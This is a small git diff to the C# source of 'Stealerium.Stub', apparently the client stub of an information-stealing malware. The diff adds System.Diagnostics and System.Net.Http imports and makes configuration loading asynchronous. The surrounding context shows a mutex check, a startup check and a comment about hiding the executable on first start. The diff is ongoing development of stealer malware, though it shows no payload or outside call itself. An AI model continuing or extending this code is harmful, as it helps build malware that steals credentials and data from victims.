@@ -1,6 +1,8 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
+using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
 using Stealerium.Stub.Helpers;
@@ -34,7 +36,7 @@ namespace Stealerium.Stub
             MutexControl.Check();
 
             // Initialize configuration
-            Config.Init();
+            await Config.InitAsync();
 
             // Hide executable on first start
             if (!Startup.IsFromStartup())
